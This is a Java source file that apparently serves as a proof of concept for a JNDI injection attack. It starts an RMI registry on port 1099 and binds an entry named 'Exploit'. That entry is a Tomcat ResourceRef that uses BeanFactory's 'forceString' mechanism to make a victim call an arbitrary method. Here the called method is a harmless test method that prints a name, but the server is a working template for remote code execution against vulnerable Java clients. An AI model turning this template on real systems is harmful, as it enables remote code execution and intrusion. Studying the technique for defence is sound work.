package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import jdk.nashorn.internal.ir.Terminal;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.security.PublicKey;

public class RMIServerMyClass {
    public static void lanuchRMIregister(Integer rmi_port) throws Exception {

        System.out.println("Creating RMI Registry, RMI Port:" + rmi_port);
        Registry registry = LocateRegistry.createRegistry(rmi_port);
        ResourceRef ref = new ResourceRef("org.example.RMIServerMyClass$Test", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=run"));
        ref.add(new StringRefAddr("x", "huhu"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);
        System.out.println(referenceWrapper.getReference());

    }

    public static void main(String[] args) throws Exception {
        lanuchRMIregister(1099);
    }

    public static class Test {
        public Test() {

        }

        public void run(String name) {
            System.out.println("My Name is " + name);
        }
    }
}
